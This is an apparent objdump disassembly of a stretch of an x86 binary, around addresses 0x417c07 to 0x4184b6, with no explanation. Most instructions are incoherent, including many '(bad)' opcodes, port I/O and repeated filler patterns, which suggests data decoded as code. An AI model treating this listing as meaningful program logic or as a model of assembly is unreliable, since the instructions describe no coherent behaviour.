  417c07:	cs adc eax,0xe2ecf25
  417c0d:	push   ss
  417c0e:	sbb    DWORD PTR [eax],0xc
  417c11:	xor    ch,BYTE PTR [ebp-0x5afbe6de]
  417c17:	xor    DWORD PTR [edi],edx
  417c19:	in     al,0x0
	...
  417c27:	add    BYTE PTR [eax],al
  417c29:	shl    BYTE PTR [edx],0xfa
  417c2c:	das    
  417c2d:	test   BYTE PTR [ebx],ch
  417c2f:	or     BYTE PTR [eax],dh
  417c31:	jl     0x417c5f
  417c33:	std    
  417c34:	jecxz  0x417bc7
  417c36:	sbb    ah,cl
  417c38:	xor    DWORD PTR [ebx+0x43],esp
  417c3b:	mov    bl,0x53
  417c3d:	inc    ebx
  417c3e:	and    esp,ecx
  417c40:	xor    ch,BYTE PTR [edi+0x2e]
  417c43:	mov    ebp,0xd62e7724
  417c48:	adc    eax,0x32c81543
  417c4d:	push   edx
  417c4e:	adc    al,0xc6
  417c50:	xor    DWORD PTR [edi],edi
  417c52:	add    eax,0xe5334fa5
  417c57:	mov    ah,BYTE PTR [eax]
  417c59:	push   edx
  417c5a:	adc    DWORD PTR [eax-0x7feee3eb],edx
  417c60:	push   ss
  417c61:	inc    ebp
  417c62:	in     eax,0x96
  417c64:	push   ss
  417c65:	xor    DWORD PTR [ecx],edx
  417c67:	out    0x3d,eax
  417c69:	sysexit 
  417c6b:	(bad)  
  417c6c:	pop    ds
  417c6d:	add    BYTE PTR [eax],bl
  417c6f:	add    BYTE PTR [ebp+0x77],bh
  417c72:	sub    ebx,DWORD PTR [edi+0x75]
  417c75:	outs   dx,DWORD PTR ds:[esi]
  417c76:	sub    ch,BYTE PTR [esi+0x9]
  417c79:	inc    edx
  417c7a:	cmp    al,0x74
  417c7c:	dec    eax
  417c7d:	pop    ebx
  417c7e:	sub    ah,BYTE PTR [ebp-0x17]
  417c81:	xor    DWORD PTR ss:[eax+0x9],edx
  417c85:	aaa    
  417c86:	pop    ss
  417c87:	ins    DWORD PTR es:[edi],dx
  417c88:	dec    edi
  417c89:	dec    eax
  417c8a:	sub    DWORD PTR [ebx+0x3a],esp
	...
  417c99:	add    BYTE PTR [eax],al
  417c9b:	add    BYTE PTR [edi+0x43],ah
  417c9e:	push   esp
  417c9f:	sbb    DWORD PTR [edx+0x6b3d632d],esi
  417ca5:	add    eax,0x168f1d66
  417caa:	push   0x2e295b04
  417caf:	(bad)  
  417cb1:	and    al,0x0
  417cb3:	cmp    dl,BYTE PTR [esi+0x23]
  417cb6:	je     0x417cb6
  417cb8:	adc    DWORD PTR [edi],0xdc541d63
  417cbe:	push   eax
  417cbf:	les    esi,FWORD PTR [ebx-0x5b0a99d6]
  417cc5:	inc    ebx
  417cc6:	push   esp
  417cc7:	mov    ecx,0xce662b49
  417ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ccd:	ss arpl bp,bx
  417cd0:	inc    ebp
  417cd1:	adc    eax,0x1141a500
  417cd6:	pop    edi
  417cd7:	lods   eax,DWORD PTR ds:[esi]
  417cd8:	dec    ecx
  417cd9:	pop    ss
  417cda:	add    BYTE PTR [ebp-0x5fafce62],bl
  417ce0:	outs   dx,BYTE PTR ds:[esi]
  417ce1:	and    ebp,DWORD PTR [ebp-0x17]
  417ce4:	xor    ebp,DWORD PTR [eax]
  417ce6:	jb     0x417c87
  417ce8:	gs pop ss
  417cea:	dec    esp
  417ceb:	nop
  417cec:	jae    0x417cff
  417cee:	cs xchg ecx,eax
  417cf0:	dec    ebp
  417cf1:	sub    DWORD PTR [eax],eax
  417cf3:	lahf   
  417cf4:	dec    ebp
  417cf5:	sbb    eax,0xda290073
  417cfa:	fs ins BYTE PTR es:[edi],dx
  417cfc:	out    0x7,eax
  417cfe:	data16 je 0x417d01
	...
  417d0d:	add    BYTE PTR [eax],al
  417d0f:	sbb    dl,ch
  417d11:	fs je  0x417cfb
  417d14:	mov    cl,0x66
  417d16:	outs   dx,BYTE PTR ds:[esi]
  417d17:	xor    eax,DWORD PTR [ecx]
  417d19:	inc    esi
  417d1a:	popa   
  417d1b:	sbb    ebp,edx
  417d1d:	dec    esi
  417d1e:	je     0x417d3d
  417d20:	repz pusha 
  417d22:	and    BYTE PTR [eax],bh
  417d24:	xlat   BYTE PTR ds:[ebx]
  417d25:	push   0x77
  417d27:	sub    esp,edi
  417d29:	jno    0x417d2b
  417d2b:	test   BYTE PTR ds:0xd4a34c50,dh
  417d31:	jae    0x417d61
  417d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d34:	out    0xff,eax
  417d36:	pop    ebx
  417d37:	(bad)  
  417d38:	out    0x6f,al
  417d3a:	ins    BYTE PTR es:[edi],dx
  417d3b:	addr16 xor al,0x74
  417d3e:	jne    0x417da6
  417d40:	(bad)  
  417d41:	push   0x5c
  417d43:	jns    0x417d3e
  417d45:	jno    0x417db6
  417d47:	dec    edi
  417d48:	cli    
  417d49:	dec    edi
  417d4a:	ins    BYTE PTR es:[edi],dx
  417d4b:	pop    ss
  417d4c:	(bad)  
  417d4d:	jmp    FWORD PTR [edx]
  417d4f:	dec    edx
  417d50:	inc    ecx
  417d51:	add    bl,al
  417d53:	inc    esi
  417d54:	inc    ecx
  417d55:	add    BYTE PTR [ebp-0x4c],ah
  417d58:	inc    esi
  417d59:	add    BYTE PTR [edi-0x50],bl
  417d5c:	inc    esi
  417d5d:	add    bh,dl
  417d5f:	mov    edi,0xaa010046
  417d64:	inc    esi
  417d65:	add    bh,bl
  417d67:	mov    BYTE PTR [esi+0x0],0xd4
  417d6b:	test   DWORD PTR [esi+0x0],0x46f4de
  417d72:	pop    ebp
	...
  417d7f:	add    BYTE PTR [eax],al
  417d81:	add    dl,dh
  417d83:	inc    esi
  417d84:	add    BYTE PTR [eax],bl
  417d86:	mov    ds:0xa15f0046,eax
  417d8b:	inc    esi
  417d8c:	add    al,ah
  417d8e:	arpl   WORD PTR [ecx+0x41],dx
  417d91:	add    BYTE PTR [ecx],dh
  417d93:	mov    WORD PTR [ecx+0x0],es
  417d96:	jp     0x417d27
  417d98:	inc    ecx
  417d99:	add    bh,dl
  417d9b:	pop    DWORD PTR [ecx+0x0]
  417d9e:	test   BYTE PTR [edi+0x7ffa0041],cl
  417da4:	inc    ecx
  417da5:	add    BYTE PTR [esi+0x48],dh
  417da8:	inc    esp
  417da9:	add    BYTE PTR [ebx+0x42],dh
  417dac:	inc    esp
  417dad:	add    BYTE PTR [edx+0x4b],al
  417db0:	inc    esp
  417db1:	add    al,dl
  417db3:	inc    esi
  417db4:	inc    esp
  417db5:	add    al,bh
  417db7:	xor    BYTE PTR [eax+eax*1-0xb],al
  417dbb:	dec    edx
  417dbc:	inc    esp
  417dbd:	add    cl,dh
  417dbf:	fild   DWORD PTR [ebx+0x0]
  417dc2:	lahf   
  417dc3:	fld    QWORD PTR [ebx+0x0]
  417dc6:	cwde   
  417dc7:	inc    BYTE PTR [ebx+0x0]
  417dca:	mov    ah,0xf0
  417dcc:	inc    ebx
  417dcd:	add    BYTE PTR [ebx-0xc],bl
  417dd0:	inc    ebx
  417dd1:	add    dl,al
  417dd3:	hlt    
  417dd4:	inc    ebx
  417dd5:	add    BYTE PTR [edx],bl
  417dd7:	add    al,0x44
  417dd9:	add    BYTE PTR [edi+0x7],bh
  417ddc:	inc    esp
  417ddd:	add    BYTE PTR [esi-0x69],bh
  417de0:	inc    ecx
  417de1:	add    BYTE PTR [eax+0x4422],bl
	...
  417df3:	add    BYTE PTR [eax],al
  417df5:	lods   al,BYTE PTR ds:[esi]
  417df6:	adc    eax,0x16440044
  417dfb:	inc    esp
  417dfc:	add    BYTE PTR [ecx],bl
  417dfe:	sbb    al,BYTE PTR [eax+eax*1-0x7e]
  417e02:	adc    eax,DWORD PTR [eax+eax*1+0x4c]
  417e06:	and    al,0x44
  417e08:	add    ch,bh
  417e0a:	and    eax,DWORD PTR [eax+eax*1+0x7e]
  417e0e:	xor    eax,0x34ff0044
  417e13:	inc    esp
  417e14:	add    BYTE PTR [ebx+0x63448105],cl
  417e1a:	mov    edi,0x3d634481
  417e1f:	jb     0x417e65
  417e21:	arpl   WORD PTR [edi+0x72],dx
  417e24:	inc    esp
  417e25:	arpl   WORD PTR [eax-0x2f9cbb9e],bp
  417e2b:	inc    edx
  417e2c:	inc    esp
  417e2d:	arpl   cx,cx
  417e2f:	inc    eax
  417e30:	inc    esp
  417e31:	arpl   WORD PTR [eax-0x729cbbc0],bx
  417e37:	mov    ds:0xa25c6343,al
  417e3c:	inc    ebx
  417e3d:	arpl   WORD PTR [edi+0x10634392],bp
  417e43:	mov    eax,DWORD PTR [ebx+0x63]
  417e46:	arpl   WORD PTR [ebx+0x7bb06343],ax
  417e4c:	inc    ebx
  417e4d:	arpl   WORD PTR ds:0x2e634374,cx
  417e53:	ins    BYTE PTR es:[edi],dx
  417e54:	inc    ebx
  417e55:	arpl   WORD PTR [edi],di
  417e57:	gs inc ebx
	...
  417e65:	add    BYTE PTR [eax],al
  417e67:	add    BYTE PTR [ebx-0x4b],ah
  417e6a:	pop    ebp
  417e6b:	inc    ebx
  417e6c:	arpl   WORD PTR [ebx-0x59],bp
  417e6f:	inc    ebx
  417e70:	arpl   sp,sp
  417e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e73:	inc    ebx
  417e74:	arpl   WORD PTR [edx],sp
  417e76:	test   al,0x43
  417e78:	arpl   WORD PTR [edx+0x416343a8],di
  417e7e:	stos   BYTE PTR es:[edi],al
  417e7f:	inc    ebx
  417e80:	arpl   WORD PTR [ebx-0x56],sp
  417e83:	inc    ebx
  417e84:	arpl   sp,si
  417e86:	sub    al,BYTE PTR [ebx+0x63]
  417e89:	out    0x23,eax
  417e8b:	inc    ebx
  417e8c:	arpl   WORD PTR [ebp+0x2c],bp
  417e8f:	inc    ebx
  417e90:	arpl   WORD PTR [edx],si
  417e92:	and    BYTE PTR [ebx+0x63],al
  417e95:	imul   esi,DWORD PTR [eax],0x43
  417e98:	arpl   cx,si
  417e9a:	sub    eax,DWORD PTR [ebx+0x63]
  417e9d:	sbb    eax,0x5202400
  417ea2:	push   eax
  417ea3:	sbb    BYTE PTR [eax],ah
  417ea5:	add    eax,0x5203a59
  417eaa:	cwde   
  417eab:	xor    al,0x20
  417ead:	add    eax,0x5203cdf
  417eb2:	push   ebx
  417eb3:	xor    DWORD PTR [eax],esp
  417eb5:	add    eax,0x520219e
  417eba:	sbb    al,0x20
  417ebc:	and    BYTE PTR ds:0x5201089,al
  417ec2:	pop    es
  417ec3:	adc    esp,DWORD PTR [eax]
  417ec5:	add    eax,0x527c385
  417eca:	add    cl,ch
	...
  417ed8:	add    BYTE PTR [eax],al
  417eda:	add    BYTE PTR [eax+0x5],ah
  417edd:	add    cl,ch
  417edf:	pusha  
  417ee0:	add    eax,0x560e900
  417ee5:	add    cl,ch
  417ee7:	pusha  
  417ee8:	add    eax,0x560e900
  417eed:	inc    ecx
  417eee:	inc    ebp
  417eef:	js     0x417f15
  417ef1:	outs   dx,BYTE PTR ds:[esi]
  417ef2:	xor    eax,0x1a5f403f
  417ef7:	pop    DWORD PTR ds:0x31a03551
  417efd:	push   ebx
  417efe:	cmp    bh,BYTE PTR [edi+edi*1]
  417f01:	dec    ebx
  417f02:	cmp    DWORD PTR [edx-0x4c2babcd],edx
  417f08:	dec    esi
  417f09:	add    ah,al
  417f0b:	cmp    al,0xe7
  417f0d:	(bad)
  417f12:	mov    ecx,0xdd00302e
  417f17:	push   esi
  417f18:	adc    al,0x63
  417f1a:	jmp    0x7a59f52
  417f1f:	inc    ebp
  417f20:	cmp    BYTE PTR [ecx+ebp*8+0x59],dh
  417f24:	add    BYTE PTR [ebx],cl
  417f26:	add    al,dl
  417f28:	push   es
  417f29:	or     cl,BYTE PTR [ecx]
  417f2b:	push   0xffffffb7
  417f2d:	ins    BYTE PTR es:[edi],dx
  417f2e:	jne    0x417f3b
  417f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f31:	or     cl,BYTE PTR [edx]
  417f33:	pop    edx
  417f34:	in     eax,dx
  417f35:	pusha  
  417f36:	ins    BYTE PTR es:[edi],dx
  417f37:	stos   BYTE PTR es:[edi],al
  417f38:	or     ah,BYTE PTR [ecx]
  417f3a:	xor    DWORD PTR [edx+0xa0aa3],ebp
	...
  417f4c:	add    BYTE PTR [eax],al
  417f4e:	ret    
  417f4f:	jmp    0x7862:0xa3c32065
  417f56:	repz lock jae 0x417f7a
  417f5a:	xchg   ebx,eax
  417f5b:	mov    ds:0xa3cb251d,eax
  417f60:	push   es
  417f61:	and    BYTE PTR [edx+0x15746aec],bl
  417f67:	mov    eax,ds:0xf0252006
  417f6c:	ins    BYTE PTR es:[edi],dx
  417f6d:	or     DWORD PTR [edi+0x1f642009],eax
  417f73:	aad    0x1f
  417f75:	or     DWORD PTR [edx-0x62],ebp
  417f78:	sub    eax,0x1da34a20
  417f7d:	and    bl,BYTE PTR [edi-0x10]
  417f80:	and    DWORD PTR [eax],esp
  417f82:	pop    edx
  417f83:	mov    eax,ds:0xd24a201d
  417f88:	addr16 gs data16 aad 0x40
  417f8d:	js     0x417fee
  417f8f:	loopne 0x418001
  417f91:	je     0x417ff2
  417f93:	inc    edx
  417f94:	add    BYTE PTR [ebx+0x72],dh
  417f97:	fisubr WORD PTR [ebx+0x6c]
  417f9a:	fnstenv [eax-0x2a999bd5]
  417fa0:	jmp    DWORD PTR [edx+edx*1-0xd]
  417fa4:	imul   ebp,DWORD PTR [edi+0x18],0xffffffe0
  417fa8:	jno    0x417fd8
  417faa:	pop    ds
  417fab:	sti    
  417fac:	pusha  
  417fad:	add    BYTE PTR [ebx+0x5b],ah
  417fb0:	out    dx,al
  417fb1:	add    BYTE PTR cs:[eax],al
	...
  417fc0:	add    BYTE PTR [esi],dh
  417fc2:	icebp  
  417fc3:	in     al,dx
  417fc4:	cs fwait
  417fc6:	lods   al,BYTE PTR ds:[esi]
  417fc7:	add    DWORD PTR [eax],eax
  417fc9:	arpl   WORD PTR [esp+esi*1+0x11c11a63],bp
  417fd0:	arpl   WORD PTR [ecx+0x5b],dx
  417fd3:	xor    BYTE PTR [esi+0x42],ch
  417fd6:	js     0x417ffe
  417fd8:	push   eax
  417fd9:	xor    DWORD PTR [ebp+0x17],esi
  417fdc:	addr16 aas 
  417fde:	mov    DWORD PTR [eax],ebp
  417fe0:	arpl   WORD PTR [ebx+0x5b],sp
  417fe3:	es push esp
  417fe5:	add    BYTE PTR [edx+0xe0a7231],cl
  417feb:	sub    ch,BYTE PTR [esi+eax*1-0x79]
  417fef:	add    BYTE PTR es:[eax],dh
  417ff2:	add    DWORD PTR [eax+ebp*2+0x2],0x2563252e
  417ffa:	inc    edi
  417ffb:	sbb    BYTE PTR [edi+0x5],ah
  417ffe:	xor    eax,0x2dfa7234
  418003:	sub    ebp,DWORD PTR [esi+eax*8+0x47]
  418007:	daa    
  418008:	add    BYTE PTR [eax-0x398dbebf],dh
  41800e:	dec    ebp
  41800f:	sbb    BYTE PTR [ebx-0x51],ah
  418012:	xlat   BYTE PTR ds:[ebx]
  418013:	sub    BYTE PTR [ebx-0x33],ah
  418016:	fcom   QWORD PTR [ecx]
  418018:	lods   eax,DWORD PTR ds:[si]
  41801a:	cmc    
  41801b:	das    
  41801c:	arpl   sp,ax
  41801e:	or     DWORD PTR [ecx+edx*2],eax
  418021:	mov    esi,0x6122ea
	...
  418032:	add    BYTE PTR [eax],al
  418034:	mov    BYTE PTR [ecx-0xa6eafef],bl
  41803a:	adc    eax,0x25097f67
  41803f:	arpl   WORD PTR [ebx-0x5],sp
  418042:	es push edx
  418044:	xchg   BYTE PTR ds:0x138617da,al
  41804a:	les    esi,FWORD PTR [ebx]
  41804c:	jno    0x41807a
  41804e:	(bad)  [edi+esi*2]
  418051:	and    dh,al
  418053:	sub    BYTE PTR [ebx+0x32],ah
  418056:	int3   
  418057:	dec    esp
  418058:	inc    ebp
  418059:	and    bh,BYTE PTR [ecx-0x33edd3d8]
  41805f:	xor    al,0x50
  418061:	es mov bl,0x24
  418064:	adc    edx,DWORD PTR [ebx]
  418066:	nop
  418067:	adc    eax,0x2684293c
  41806c:	inc    eax
  41806d:	add    eax,0x126428ba
  418072:	call   0xfc11:0x9727062c
  418079:	daa    
  41807a:	mov    BYTE PTR [ecx],dl
  41807c:	adc    al,0x31
  41807e:	xchg   BYTE PTR [edx],ch
  418080:	add    BYTE PTR [edi],ah
  418082:	xchg   edi,eax
  418083:	adc    DWORD PTR [edi+ecx*1],eax
  418086:	push   eax
  418087:	xor    BYTE PTR [eax],al
  418089:	push   ds
  41808a:	inc    esp
  41808b:	add    al,0x63
  41808d:	add    eax,0x56303e7
  418092:	out    0x3,eax
  418094:	arpl   WORD PTR ds:0x3e7,ax
	...
  4180a6:	add    BYTE PTR [ebx+0x5],ah
  4180a9:	out    0x3,eax
  4180ab:	arpl   WORD PTR ds:0x56303e7,ax
  4180b1:	out    0x3,eax
  4180b3:	arpl   WORD PTR ds:0x56303e7,ax
  4180b9:	out    0x3,eax
  4180bb:	arpl   WORD PTR ds:0x56303e7,ax
  4180c1:	out    0x3,eax
  4180c3:	arpl   WORD PTR ds:0x56303e7,ax
  4180c9:	out    0x3,eax
  4180cb:	arpl   WORD PTR ds:0x560e900,ax
  4180d1:	add    cl,ch
  4180d3:	pusha  
  4180d4:	add    eax,0x560e900
  4180d9:	add    cl,ch
  4180db:	pusha  
  4180dc:	add    eax,0x560e900
  4180e1:	add    cl,ch
  4180e3:	pusha  
  4180e4:	add    eax,0x560e900
  4180e9:	add    cl,ch
  4180eb:	pusha  
  4180ec:	add    eax,0x560e900
  4180f1:	add    cl,ch
  4180f3:	pusha  
  4180f4:	add    eax,0x560e900
  4180f9:	add    cl,ch
  4180fb:	pusha  
  4180fc:	add    eax,0x560e900
  418101:	add    cl,ch
  418103:	pusha  
  418104:	add    eax,0x560e900
  418109:	add    cl,ch
	...
  418117:	add    BYTE PTR [eax],al
  418119:	add    BYTE PTR [eax+0x5],ah
  41811c:	add    cl,ch
  41811e:	pusha  
  41811f:	add    eax,0x560e900
  418124:	add    cl,ch
  418126:	pusha  
  418127:	add    eax,0x560e900
  41812c:	add    cl,ch
  41812e:	pusha  
  41812f:	add    eax,0x560e900
  418134:	add    cl,ch
  418136:	pusha  
  418137:	add    eax,0x560e900
  41813c:	add    cl,ch
  41813e:	pusha  
  41813f:	add    eax,0x560e900
  418144:	add    cl,ch
  418146:	pusha  
  418147:	add    eax,0x560e900
  41814c:	add    cl,ch
  41814e:	pusha  
  41814f:	add    eax,0x560e900
  418154:	add    BYTE PTR [eax],al
  418156:	or     cl,BYTE PTR [eax]
  418158:	add    BYTE PTR [eax],al
  41815a:	cli    
  41815b:	pop    es
  41815c:	add    BYTE PTR [eax],al
  41815e:	cli    
  41815f:	pop    es
  418160:	add    BYTE PTR [eax],al
  418162:	or     cl,BYTE PTR [eax]
  418164:	add    BYTE PTR [eax],al
  418166:	or     cl,BYTE PTR [eax]
  418168:	add    BYTE PTR [eax],al
  41816a:	cli    
  41816b:	pop    es
  41816c:	add    BYTE PTR [eax],al
  41816e:	cli    
  41816f:	pop    es
  418170:	add    BYTE PTR [eax],al
  418172:	retf   0x7
  418175:	add    dl,cl
  418177:	pop    es
  418178:	add    BYTE PTR [eax],al
  41817a:	mov    edx,0x7
	...
  41818b:	add    BYTE PTR [eax],al
  41818d:	mov    edx,0xca000007
  418192:	pop    es
  418193:	add    BYTE PTR [eax],al
  418195:	retf   0x7
  418198:	add    BYTE PTR [edx-0x45fffff9],bh
  41819e:	pop    es
  41819f:	add    BYTE PTR [eax],al
  4181a1:	mov    al,BYTE PTR [edi]
  4181a3:	add    BYTE PTR [eax],al
  4181a5:	mov    al,BYTE PTR [edi]
  4181a7:	add    BYTE PTR [eax],al
  4181a9:	jp     0x4181b2
  4181ab:	add    BYTE PTR [eax],al
  4181ad:	jp     0x4181b6
  4181af:	add    BYTE PTR [eax],al
  4181b1:	mov    al,BYTE PTR [edi]
  4181b3:	add    BYTE PTR [eax],al
  4181b5:	mov    al,BYTE PTR [edi]
  4181b7:	add    BYTE PTR [eax],al
  4181b9:	jp     0x4181c2
  4181bb:	add    BYTE PTR [eax],al
  4181bd:	jp     0x4181c6
  4181bf:	add    BYTE PTR [eax],al
  4181c1:	dec    edx
  4181c2:	pop    es
  4181c3:	add    BYTE PTR [eax],al
  4181c5:	dec    edx
  4181c6:	pop    es
  4181c7:	add    BYTE PTR [eax],al
  4181c9:	cmp    al,BYTE PTR [edi]
  4181cb:	add    BYTE PTR [eax],al
  4181cd:	cmp    al,BYTE PTR [edi]
  4181cf:	add    BYTE PTR [eax],al
  4181d1:	dec    edx
  4181d2:	pop    es
  4181d3:	add    BYTE PTR [eax],al
  4181d5:	dec    edx
  4181d6:	pop    es
  4181d7:	add    BYTE PTR [eax],al
  4181d9:	cmp    al,BYTE PTR [edi]
  4181db:	add    BYTE PTR [eax],al
  4181dd:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  4181e4:	add    BYTE PTR [ebx-0x64],ah
  4181e7:	add    DWORD PTR [eax],eax
  4181e9:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
	...
  418200:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  418207:	add    BYTE PTR [ebx-0x64],ah
  41820a:	add    DWORD PTR [eax],eax
  41820c:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  418213:	add    BYTE PTR [ebx-0x64],ah
  418216:	add    DWORD PTR [eax],eax
  418218:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  41821f:	add    BYTE PTR [ebx-0x64],ah
  418222:	add    DWORD PTR [eax],eax
  418224:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  41822b:	add    BYTE PTR [ebx-0x64],ah
  41822e:	add    DWORD PTR [eax],eax
  418230:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  418237:	add    BYTE PTR [ebx-0x64],ah
  41823a:	add    DWORD PTR [eax],eax
  41823c:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  418243:	add    BYTE PTR [ebx-0x64],ah
  418246:	add    DWORD PTR [eax],eax
  418248:	arpl   WORD PTR [ecx+eax*1-0x19629d00],bx
  41824f:	inc    edx
  418250:	les    esp,FWORD PTR ds:0xca44cb6d
  418256:	mov    eax,0x2fd9ebba
  41825b:	xor    dh,BYTE PTR [ebx+0x25]
  41825e:	ins    DWORD PTR es:[edi],dx
  41825f:	retf   
  418260:	dec    esp
  418261:	popf   
  418262:	out    0x42,al
	...
  418270:	add    BYTE PTR [eax],al
  418272:	add    BYTE PTR [ebp+eax*1+0x5a30467],bh
  418279:	mov    DWORD PTR [ebx],0x3df0553
  41827f:	addr16 add eax,0x921403e9
  418285:	out    0x3,eax
  418287:	jecxz  0x41828d
  418289:	out    0x3,eax
  41828b:	mov    ds:0x4303e705,eax
  418290:	add    eax,0x55303e7
  418295:	out    0x3,eax
  418297:	pop    ebx
  418298:	add    eax,0x55f03e7
  41829d:	out    0x3,eax
  41829f:	popa   
  4182a0:	add    eax,0x91d403e7
  4182a5:	out    0x83,eax
  4182a7:	arpl   WORD PTR ds:0x56343e7,ax
  4182ad:	out    0xe3,eax
  4182af:	mov    esp,0xb4f3e791
  4182b4:	xchg   ecx,eax
  4182b5:	out    0xb,eax
  4182b7:	arpl   WORD PTR ds:0x91a4ffe7,ax
  4182bd:	out    0x5,eax
  4182bf:	arpl   WORD PTR ds:0x56304e7,ax
  4182c5:	addr16 add al,0x63
  4182c8:	add    eax,0x56303a7
  4182cd:	mov    DWORD PTR [ebx],0x3d70563
  4182d3:	arpl   WORD PTR ds:0x3ef,ax
	...
  4182e5:	add    BYTE PTR [ebx+0x5],ah
  4182e8:	jecxz  0x4182ed
  4182ea:	arpl   WORD PTR ds:0x56303e9,ax
  4182f0:	call   0xff46e5f8
  4182f5:	rol    DWORD PTR [ebp+eiz*8+0x55cf3de],cl
  4182fc:	add    al,dh
  4182fe:	pop    ss
  4182ff:	call   0x8715322
  418304:	jmp    edx
  418306:	push   ss
  418307:	fbld   TBYTE PTR [ecx]
  418309:	add    ebp,DWORD PTR ds:0x35d201ff
  41830f:	fisub  WORD PTR [eax]
  418311:	iret   
  418312:	xor    ah,bl
  418314:	and    eax,0x60312e7
  418319:	mov    esp,0xd422dc33
  41831e:	repz sti 
  418320:	add    ch,BYTE PTR [ebp+0x523dd24]
  418326:	repz cld 
  418328:	add    eax,DWORD PTR [edx]
  41832a:	in     al,dx
  41832b:	std    
  41832c:	add    al,ch
  41832e:	or     WORD PTR [esi],ax
  418331:	loope  0x418399
  418333:	add    DWORD PTR [esi],ecx
  418335:	not    bh
  418337:	cmc    
  418338:	adc    dl,dh
  41833a:	(bad)  
  41833b:	in     eax,dx
  41833c:	sbb    esp,esp
  41833e:	mov    al,0xfe
  418340:	adc    al,0xe9
  418342:	mov    ah,0x6
  418344:	sbb    edi,esi
  418346:	arpl   cx,di
  418348:	push   es
  418349:	test   DWORD PTR [eax],0x0
	...
  418357:	add    BYTE PTR [eax],al
  418359:	scas   al,BYTE PTR es:[edi]
  41835a:	std    
  41835b:	add    al,dh
  41835d:	popa   
  41835e:	add    al,BYTE PTR [esi]
  418360:	repz (bad) 
  418362:	cld    
  418363:	(bad)  
  418364:	shl    BYTE PTR [ebp-0x4d30dc0e],1
  41836a:	jmp    0x418390
  41836c:	mov    ebx,0xc22cf084
  418371:	nop
  418372:	jmp    0x1826:0xdb930834
  418379:	jle    0x418367
  41837b:	sbb    al,0xe9
  41837d:	pop    esp
  41837e:	pop    DWORD PTR [eax]
  418380:	jmp    0x4188e5
  418385:	cmp    al,BYTE PTR [edi*8-0x16fc101]
  41838c:	add    BYTE PTR [esi+0x4],cl
  41838f:	std    
  418390:	add    BYTE PTR [esi],bh
  418392:	nop
  418393:	(bad)  
  418394:	(bad)  
  418395:	ds add al,0x0
  418398:	add    BYTE PTR [edx],bh
  41839a:	add    al,0xfd
  41839c:	dec    DWORD PTR [edx]
  41839e:	nop
  41839f:	std    
  4183a0:	dec    DWORD PTR [edx]
  4183a2:	nop
  4183a3:	inc    BYTE PTR [eax]
  4183a5:	dec    BYTE PTR [edi-0x7005ff02]
  4183ab:	std    
  4183ac:	dec    DWORD PTR [esi]
  4183ae:	nop
  4183af:	std    
  4183b0:	add    dh,bh
  4183b2:	add    edi,ebp
  4183b4:	add    dl,bh
  4183b6:	add    eax,DWORD PTR [eax]
  4183b8:	add    esi,edi
  4183ba:	add    eax,DWORD PTR [eax]
	...
  4183cc:	into   
  4183cd:	(bad)  
  4183ce:	std    
  4183cf:	dec    edx
  4183d1:	(bad)  
  4183d2:	std    
  4183d3:	add    BYTE PTR [edx-0x45ff0271],bh
  4183d9:	(bad)  
  4183da:	(bad)  
  4183db:	dec    edx
  4183dd:	(bad)  
  4183de:	(bad)  
  4183df:	dec    edx
  4183e1:	add    edi,ebp
  4183e3:	add    BYTE PTR [edx-0x41ff02fd],bh
  4183e9:	(bad)  
  4183ea:	std    
  4183eb:	add    BYTE PTR [esi+0x7efffd03],cl
  4183f1:	add    eax,DWORD PTR [eax]
  4183f3:	add    DWORD PTR [esi+0x3],edi
  4183f6:	add    BYTE PTR [ecx],al
  4183f8:	jle    0x4183fd
  4183fa:	std    
  4183fb:	dec    DWORD PTR [edx+0x7e000003]
  418401:	(bad)  
  418402:	std    
  418403:	(bad)  
  418404:	jle    0x418395
  418406:	(bad)  
  418407:	(bad)  
  418408:	jp     0x41840d
  41840a:	add    BYTE PTR [ecx],al
  41840c:	arpl   WORD PTR [ecx+eax*1-0x256ab01],bx
  418413:	(bad)  
  418414:	arpl   WORD PTR [eax-0x639cffff],sp
  41841a:	add    edi,edi
  41841c:	arpl   WORD PTR [ebp+edi*8+0x19c63fe],bx
  418423:	add    BYTE PTR [edx-0x64],ah
  418426:	add    DWORD PTR [eax],eax
  418428:	bound  ebx,QWORD PTR [ebp+edi*8+0x1a11cff]
  41842f:	inc    DWORD PTR [eax]
	...
  41843d:	add    BYTE PTR [eax],al
  41843f:	arpl   WORD PTR [ecx+eax*1-0x262f301],bx
  418446:	inc    BYTE PTR [ecx+ebp*4]
  418449:	add    DWORD PTR [eax],eax
  41844b:	bound  ebx,QWORD PTR [ebp+edi*8+0x1a8f4ff]
  418452:	add    BYTE PTR [ebx-0x60],ah
  418455:	std    
  418456:	jmp    DWORD PTR [ebx-0x58]
  418459:	std    
  41845a:	(bad)  
  41845b:	fsub   QWORD PTR [eax-0x579c0103]
  418461:	add    edi,edi
  418463:	int3   
  418464:	pushf  
  418465:	add    edi,edi
  418467:	arpl   WORD PTR [eax-0x5f9c0003],bp
  41846d:	add    DWORD PTR [eax],eax
  41846f:	bound  ebp,QWORD PTR [eax-0x5f530003]
  418475:	std    
  418476:	(bad)  
  418477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418478:	pushf  
  418479:	std    
  41847a:	(bad)  
  41847b:	arpl   WORD PTR [eax-0x636b0003],sp
  418481:	std    
  418482:	jmp    DWORD PTR [ebx-0x64]
  418485:	std    
  418486:	jmp    DWORD PTR [ebx-0x64]
  418489:	add    DWORD PTR [eax],eax
  41848b:	arpl   WORD PTR [eax-0x638b00ff],sp
  418491:	std    
  418492:	(bad)  
  418493:	ins    BYTE PTR es:[edi],dx
  418494:	add    eax,0x56303e7
  418499:	jecxz  0x41849e
  41849b:	pop    esp
  41849c:	add    eax,0x85738407
  4184a1:	out    0x83,eax
	...
  4184af:	add    BYTE PTR [eax],al
  4184b1:	add    BYTE PTR [ebx-0x7b],ah
  4184b4:	out    0x83,eax
  4184b6:	arpl   WORD PTR ds:0x5538407,ax
